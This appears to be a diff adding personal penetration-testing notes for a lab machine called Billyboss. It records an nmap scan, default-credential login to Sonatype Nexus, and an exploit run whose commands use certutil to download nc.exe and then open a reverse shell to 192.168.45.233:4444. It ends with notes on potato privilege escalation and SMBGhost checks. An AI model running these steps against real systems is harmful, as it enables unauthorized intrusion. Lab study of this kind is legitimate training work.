@@ -1,0 +1,88 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.192.61 > Billyboss.txt
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           Microsoft ftpd
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-title: BaGet
+|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
+|_http-favicon: Unknown favicon MD5: 8D9ADDAFA993A4318E476ED8EB0C8061
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+5040/tcp  open  unknown
+8081/tcp  open  http          Jetty 9.4.18.v20190429
+|_http-title: Nexus Repository Manager
+| http-methods: 
+|_  Supported Methods: GET HEAD
+| http-robots.txt: 2 disallowed entries 
+|_/repository/ /service/
+|_http-favicon: Unknown favicon MD5: 9A008BECDE9C5F250EDAD4F00E567721
+|_http-server-header: Nexus/3.21.0-05 (OSS)
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-05-06T05:56:29
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+
+
+http://192.168.192.61:8081/
+Found Sonatype Nexus Repository Manager
+$ searchsploit sonatype
+Sonatype Nexus 3.21.1 - Remote Code Execution (Authenti | java/webapps/49385.py
+
+Use this way to get default credentials.
+(alan㉿kali)-[/usr/share/wordlists/seclists/Passwords]
+└─$ grep -r "Sonatype Nexus"
+Default-Credentials/default-passwords.csv:Sonatype Nexus Repository Manager,admin,admin123,https://help.sonatype.com/repomanager2/maven-and-other-build-tools/sbt
+Default-Credentials/default-passwords.csv:Sonatype Nexus Repository Manager,nexus,nexus,
+
+Use nexus:nexus as credential.
+$ python3 49385.py
+Logging in
+Logged in successfully
+Command executed
+In 49385.py edit CMD field then run two times. (Upload nc.exe then connect back a reverse shell)
+CMD='cmd.exe /c certutil.exe -split -f -urlcache http://192.168.45.233/nc.exe'
+CMD="cmd.exe /c nc.exe 192.168.45.233 4444 -e cmd.exe"
+
+C:\Users\nathan\Nexus\nexus-3.21.0-05>whoami /priv
+SeImpersonatePrivilege
+can potato here, to get SYSTEM shell.
+
+################################################################################
+Try lab target, SMBGhost, use below three steps to confirm this vulnerable.
+Saw patch KB4540673
+Systeminfo
+Microsoft Windows 10 Pro
+10.0.18362 N/A Build 18362 
+# indicate Vulnerable Build Numbers:
+Windows 10 version 1903: Build 18362
+Windows 10 version 1909: Build 18363
+
+Analyze Installed Patches (KB Search)
+Even if the build version matches, the system might have been patched. The specific update that fixed SMBGhost is KB4540673.
+
+But in this lab it actually shows patch with KB4540673.
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" | Select-Object -Property DisableCompression
+Check and found DisableCompression missing. # If not patched, with these three confirm, can try SMBGhost
+
+
+
+
+
+
+
